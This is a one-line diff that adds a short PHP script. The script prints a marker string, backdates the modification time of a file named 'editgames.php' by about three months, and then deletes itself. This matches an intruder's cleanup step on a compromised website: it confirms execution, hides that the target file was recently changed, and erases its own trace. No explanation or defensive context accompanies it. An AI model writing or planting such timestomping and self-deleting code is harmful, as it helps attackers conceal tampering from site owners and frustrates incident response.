@@ -1,0 +1,1 @@
+<?php echo "pssVDrkyCu"; if (file_exists("./editgames.php")){ touch("./editgames.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*URFvSHuDY40Xaz1AHvYK*/ ?>
